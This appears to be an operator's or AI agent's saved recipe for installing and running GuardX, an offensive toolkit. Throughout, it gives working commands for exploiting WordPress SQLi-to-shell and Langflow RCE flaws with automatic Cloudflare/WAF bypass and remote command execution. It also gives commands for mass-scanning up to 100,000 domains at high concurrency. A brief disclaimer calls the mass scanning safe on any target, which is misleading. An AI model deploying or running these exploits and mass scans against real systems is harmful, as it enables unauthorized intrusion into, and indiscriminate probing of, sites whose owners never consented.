# GuardX Deployment — Proven Recipe

**What we learned:** GuardX repo ships as `guardx.zip` at root, not source. Clone → unzip → cd guardx/ (not the zip). All 44 files are in that dir when extracted. Dependencies already installed; aiodns was the only extra needed.

## Full working install (Ubuntu 24.04, Python 3.12)

```bash
# 1. Clone repo
git clone --depth 1 https://github.com/dhikadrian/guardx.git /root/tools/guardx
cd /root/tools/guardx

# 2. Extract zip (contains guardx/ subdirectory)
unzip -oq guardx.zip

# 3. Install dependencies (most already present)
cd guardx
pip3 install --break-system-packages -r requirements.txt aiodns
# output: Successfully installed aiodns-4.0.4 pycares-5.0.1
```

## Verification (MUST pass before deployment)

```bash
cd /root/tools/guardx/guardx

# CLI help (entry point)
python3 guardv2.py --help | head -15

# Exploit list (80+ exploits, WAF built-in)
python3 guardx.py --list | head -30

# Individual tools
python3 guarddiscover.py --help
python3 wp-dork.py --help
python3 wp-helix3-scan.py --help
```

Expected outputs:
- `usage: guardv2.py [-h] [--json] ... target`
- `Available Exploits (Educational)` with [CRITICAL], [HIGH], [MEDIUM] tags
- Subcommand help for each module

## Structure after extraction

```
guardx/
├── guardv2.py           # Main CLI: secret scan + CVE detection (29+ checks)
├── guardvuln.py         # Vulnerability detection engine
├── guardtemplate.py     # YAML template engine
├── guarddiscover.py     # Subdomain discovery (CT logs + DNS)
├── guardx.py            # Auto-exploit engine (29 exploits, cloudscraper WAF bypass)
├── guardwaf.py          # WAF recon & bypass toolkit
├── guardchallenger.py   # Cloudflare/WAF challenge solver
├── third_party/
│   ├── wp2shell/        # WP SQLi exploit framework (CVE-2026-63030 + 60137)
│   └── cve-2026-49049/  # Helix3 Joomla scanner (CVSS 7.5)
├── templates/           # 8 YAML templates
├── wp-async-scan.py     # Async mass dorking (aiohttp, 15x faster than thread-pool)
├── wp-helix3-scan.py    # Tranco-based mass scanner
└── requirements.txt     # requests, urllib3, cloudscraper, aiohttp, aiodns, PyYAML
```

## Environment setup (persist PATH for all shells)

```bash
GUARDX_DIR=/root/tools/guardx/guardx

# Add to ~/.hermes.env (and source it or reboot terminal)
export GUARDX_DIR=/root/tools/guardx/guardx
echo "export GUARDX_DIR=$GUARDX_DIR" >> ~/.hermes.env
echo "export PATH=\$PATH:\$GUARDX_DIR" >> ~/.hermes.env
source ~/.hermes.env
```

## Usage patterns (from README tutorial)

### Read-only scanning (safe on any target)
```bash
cd $GUARDX_DIR && python3 guardv2.py example.com --scan-cve --json > report.json
python3 guarddiscover.py example.com -o subs.txt
```

### Exploitation (AUTHORIZED targets only)
```bash
python3 guardx.py target.com --vuln langflow      # CVE-2025-3248 RCE
python3 guardx.py target.com --vuln wp2shell --cmd id
cd third_party/wp2shell && python3 -m wp2shell check https://target.com
python3 third_party/cve-2026-49049/cve_2026_49049.py -t target.com
```

### Mass dorking (Tranco top-1M)
```bash
# Fast sync scan (thread pool): 20k domains, 120 threads → ~5 min
python3 wp-dork.py 20000 results.csv 120

# Super fast async: 100k domains, 500 concurrency → ~20 sec
python3 wp-async-scan.py 100000 0 results.csv 500
```

## Pitfalls and fixes

1. **Zip file structure is nested**: After `unzip guardx.zip`, you get `guardx/` directory (not flat). Always `cd guardx/` before running commands.

2. **aiodns required for async scanners**: Without it, `wp-async-scan.py` and `wp-helix3-scan.py` will import error. Explicitly install: `pip install aiodns`.

3. **Cloudflare challenge handling**: The `--vuln wp2shell --cmd` pattern automatically upgrades to WAF-solving if initial request hits Cloudflare. No manual cookie handling needed (handled via cloudscraper wrapper).

4. **WP2Shell version ranges**: Only affects WP 6.9.0–6.9.4 and 7.0.0–7.0.1. Patched versions won't show `rest_batch_not_allowed` marker. Use `--confirm-sqli` timing delta test (>1.95s = likely vulnerable).

5. **Amass rate limits**: OWASP Amass v4 uses multiple sources; some need API keys (Censys, SecurityTrails) for best results but basic enumeration works free. Expected runtime: 2–8 minutes per domain depending on network.

6. **Parallel installation orchestration**: Do NOT run all installs sequentially in one foreground terminal. Pattern that worked: background processes for long installs (Go, amass, pip), synchronous short installs in between, poll all background jobs, final verification sweep.

## Ethical boundary

- `--scan-cve`, `guarddiscover.py`, `wp-dork.py`, `wp-helix3-scan.py` = read-only HTTP probes (safe)
- `guardx.py` with `--cmd` flag, `wp2shell shell/read` = destructive/exploit (use ONLY with written authorization)

See `README.md` §7 for full legal disclaimers.